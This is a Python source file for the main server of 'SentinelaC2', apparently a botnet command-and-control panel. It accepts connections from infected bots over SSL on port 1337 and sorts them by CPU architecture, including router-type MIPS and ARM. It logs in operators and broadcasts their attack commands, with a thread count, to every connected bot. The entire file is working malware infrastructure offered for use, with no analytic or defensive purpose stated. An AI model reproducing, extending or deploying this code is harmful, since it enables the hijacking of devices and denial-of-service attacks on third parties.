import threading
import socket
import time
import logging
import os
import base64
import secrets
from datetime import datetime
from colorama import Fore, init

from src.config.config import configs
from src.database.database import login, get_user
from src.utils.validators import validate_username
from src.utils.security import sanitize_log, sanitize_command, verify_bot_auth, RateLimiter
from src.utils.network import safe_recv, setup_ssl_socket, create_server_socket
from src.utils.ui import colorize_text_gradient, send as ui_send, format_banner_info, format_title, ANSI_CLEAR, COLORS
from src.utils.bot_manager import BotManager
from src.utils.attack_manager import AttackManager
from src.utils.session_manager import SessionManager
from src.utils.command_handler import CommandHandler

base_dir = os.path.abspath(os.path.dirname(os.path.dirname(__file__)))
log_dir = os.path.join(base_dir, 'logs')
if not os.path.isabs(log_dir) or not log_dir.startswith(base_dir):
    log_dir = os.path.join(base_dir, 'logs')
os.makedirs(log_dir, exist_ok=True)

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[
        logging.FileHandler(os.path.join(log_dir, f'sentinela_{datetime.now().strftime("%Y%m%d")}.log')),
        logging.StreamHandler()
    ]
)

class SentinelaServer:
    def __init__(self):
        logging.info("Initializing Sentinela server...")
        self.config = configs()
        self.global_limits = self.config.get("global_limits", {})
        server_config = self.config.get("server", {})
        self.c2_name = server_config.get("name", "SentinelaC2")
        self.host = server_config.get("host", "0.0.0.0")
        self.port = int(server_config.get("port", 1337))
        
        self.clients = {}
        self.attacks = {}
        self.bots = {}
        self.sessions = {}
        self.locks = {
            'clients': threading.Lock(),
            'attacks': threading.Lock(),
            'bots': threading.Lock(),
            'sessions': threading.Lock()
        }
        
        self.rate_limiter = RateLimiter(max_attempts=5, window_seconds=300)
        self.rate_limiter.set_lock(self.locks['sessions'])
        
        bot_secret_b64 = self.config.get("bot_secret")
        if bot_secret_b64:
            self.bot_secret = base64.b64decode(bot_secret_b64.encode('utf-8'))
        else:
            self.bot_secret = secrets.token_bytes(32)
        
        self.max_username_len = 32
        self.max_password_len = 128
        self.max_data_len = 1024
        self.connection_timeout = 120
        
        self.bots_by_arch = {
            "i386": [], "mips": [], "mips64": [], "x86_64": [],
            "armv7l": [], "armv8l": [], "aarch64": [], "ppc64le": [],
            "unknown": [],
        }
        
        self.banner = f'''
                    .▄▄ · ▄▄▄ . ▐ ▄ ▄▄▄▄▄▪   ▐ ▄ ▄▄▄ .▄▄▌   ▄▄▄· 
                    ▐█ ▀. ▀▄.▀·•█▌▐█•██  ██ •█▌▐█▀▄.▀·██•  ▐█ ▀█ 
                    ▄▀▀▀█▄▐▀▀▪▄▐█▐▐▌ ▐█.▪▐█·▐█▐▐▌▐▀▀▪▄██▪  ▄█▀▀█ 
                    ▐█▄▪▐█▐█▄▄▌██▐█▌ ▐█▌·▐█▌██▐█▌▐█▄▄▌▐█▌▐▌▐█ ▪▐▌
                     ▀▀▀▀  ▀▀▀ ▀▀ █▪ ▀▀▀ ▀▀▀▀▀ █▪ ▀▀▀ .▀▀▀  ▀  ▀ 
                 Sentinela by Cirqueira  |  Type 'help' for commands
                 
'''
        self.banner = colorize_text_gradient(self.banner)
        
        init(convert=True)
        self.colors = COLORS
        
        self.bot_manager = BotManager(self.bots, self.bots_by_arch, self.locks)
        self.session_manager = SessionManager(self.sessions, self.locks)
        
        self.attack_manager = None
        self.command_handler = None
    
    def send(self, socket_obj, data, escape=True, reset=True):
        ui_send(socket_obj, data, escape, reset)
    
    def broadcast(self, data, username):
        dead_bots = []
        threads = self.global_limits.get("threads")
        
        sanitized_data = sanitize_command(data)
        sanitized_username = sanitize_command(username)
        
        with self.locks['bots']:
            bots_copy = list(self.bots.keys())
        
        for bot in bots_copy:
            try:
                if len(sanitized_data) > 5:
                    safe_cmd = f'{sanitized_data} {threads} {sanitized_username}'
                else:
                    safe_cmd = f'{sanitized_data} {sanitized_username}'
                self.send(bot, safe_cmd, False, False)
            except:
                dead_bots.append(bot)
        
        for bot in dead_bots:
            try:
                bot.close()
            except:
                pass
            self.bot_manager.remove(bot)
    
    def _initialize_managers(self):
        if self.attack_manager is None:
            self.attack_manager = AttackManager(
                self.attacks, self.global_limits, self.locks,
                self.bot_manager, self.send, self.broadcast
            )
        if self.command_handler is None:
            self.command_handler = CommandHandler(self)
    
    def start(self):
        logging.info(f"Starting server {self.c2_name} on {self.host}:{self.port}")
        
        if not (1 <= self.port <= 65535):
            logging.error("Invalid port")
            return False
        
        self.sock = create_server_socket()
        server_config = self.config.get("server", {})
        self.sock = setup_ssl_socket(self.sock, server_config)
        
        try:
            self.sock.bind((self.host, self.port))
        except Exception as e:
            logging.error(f"Error opening port: {e}")
            return False
        
        self.sock.listen()
        self.sock.settimeout(1.0)
        
        self._initialize_managers()
        
        threading.Thread(target=self._ping_bots_loop, daemon=True).start()
        threading.Thread(target=self._cleanup_sessions_loop, daemon=True).start()
        threading.Thread(target=self._cleanup_rate_limits_loop, daemon=True).start()
        
        logging.info(f"Server {self.c2_name} online!")

        while True:
            try:
                client, address = self.sock.accept()
                client.settimeout(self.connection_timeout)
                threading.Thread(target=self.handle_client, args=(client, address), daemon=True).start()
            except socket.timeout:
                continue
            except Exception as e:
                logging.error(f"Error accepting connection: {e}")
        
        return True
    
    def handle_client(self, client, address):
        try:
            self.send(client, f'\33]0;{self.c2_name} | Login\a', False)
            
            username = self._get_username(client)
            if not username:
                client.close()
                return
            
            password = self._get_password(client)
            if not password:
                client.close()
                return
            
            if verify_bot_auth(password, username, self.bot_secret):
                self.bot_manager.register(client, address, username)
                return
            
            if not self.rate_limiter.check_rate_limit(address):
                self.send(client, Fore.RED + 'Too many login attempts. Please try again later.')
                time.sleep(2)
                client.close()
                return
            
            self.send(client, ANSI_CLEAR, False)
            
            if not login(username, password):
                self.send(client, Fore.RED + 'Invalid credentials')
                logging.warning(f"Login attempt failed: {sanitize_log(username)} from {address[0]}")
                time.sleep(1)
                client.close()
                return
            
            session_token = self.session_manager.create(username, address)
            logging.info(f"User logged in: {sanitize_log(username)} from {address[0]}")
            
            with self.locks['clients']:
                self.clients[client] = {'address': address, 'session': session_token}
            
            threading.Thread(target=self._update_title_loop, args=(client, username), daemon=True).start()
            threading.Thread(target=self._command_line_loop, args=(client, username, session_token), daemon=True).start()
        
        except Exception as e:
            logging.error(f"Error processing client: {str(e)[:100]}")
            try:
                client.close()
            except:
                pass
    
    def _get_username(self, client):
        for _ in range(3):
            self.send(client, ANSI_CLEAR, False)
            self.send(client, f'{Fore.LIGHTBLUE_EX}Username{Fore.LIGHTWHITE_EX}: ', False)
            data = safe_recv(client, self.max_data_len)
            if not data:
                return None
            username = data.decode('utf-8', errors='ignore').strip()
            if username and validate_username(username, self.max_username_len):
                return username
            if username:
                self.send(client, Fore.RED + 'Invalid username format\n')
        return None
    
    def _get_password(self, client):
        for _ in range(3):
            self.send(client, f'{Fore.LIGHTBLUE_EX}Password{Fore.LIGHTWHITE_EX}:{Fore.BLACK} ', False, False)
            data = safe_recv(client, self.max_data_len)
            if not data:
                return None
            password = data.decode('utf-8', errors='ignore').strip()
            if password and len(password) <= self.max_password_len:
                return password
        return None
    
    def _ping_bots_loop(self):
        while True:
            self.bot_manager.ping_all(self.send, lambda c, s: safe_recv(c, self.max_data_len))
            time.sleep(4)
    
    def _cleanup_sessions_loop(self):
        while True:
            try:
                self.session_manager.cleanup_expired(3600)
            except:
                pass
            time.sleep(60)
    
    def _cleanup_rate_limits_loop(self):
        while True:
            try:
                self.rate_limiter.cleanup()
            except:
                pass
            time.sleep(300)
    
    def _update_title_loop(self, client, username):
        try:
            user_data = get_user(username)
            max_attacks = self.global_limits.get("max_attacks")
            
            while True:
                clients_count = len(self.clients)
                bots_count = self.bot_manager.get_count()
                attacks_count = self.attack_manager.get_count()
                
                title = format_title(
                    self.c2_name, username, user_data,
                    clients_count, bots_count, attacks_count, max_attacks
                )
                self.send(client, title, False)
                time.sleep(0.6)
        except Exception:
            try:
                client.close()
            except:
                pass
    
    def _command_line_loop(self, client, username, session_token):
        self._initialize_managers()
        
        user_data = get_user(username)
        self.return_banner(client, username, user_data)
        
        prompt = f'{Fore.LIGHTBLUE_EX}{colorize_text_gradient(self.c2_name)} {Fore.LIGHTWHITE_EX}> '
        self.send(client, prompt, False)
        
        try:
            while True:
                self.session_manager.update_activity(session_token)
                
                data = safe_recv(client, self.max_data_len)
                if not data:
                    break
                
                data = data.decode('utf-8', errors='ignore').strip()
                if not data:
                    continue
                
                should_continue = self.command_handler.handle(client, username, session_token, data)
                if not should_continue:
                    break
                
                self.send(client, prompt, False)
        
        except Exception as e:
            logging.error(f"Error in command line: {str(e)[:100]}")
        finally:
            try:
                client.close()
            except:
                pass
            with self.locks['clients']:
                if client in self.clients:
                    del self.clients[client]
            self.session_manager.remove(session_token)
            logging.info(f"Client disconnected: {sanitize_log(username)}")
    
    def return_banner(self, client, username, user_data):
        bots_count = self.bot_manager.get_count()
        banner_info = format_banner_info(username, user_data, bots_count)
        self.send(client, banner_info)
        for line in self.banner.split('\n'):
            self.send(client, line)

def main():
    server = SentinelaServer()
    server.start()

if __name__ == '__main__':
    main()
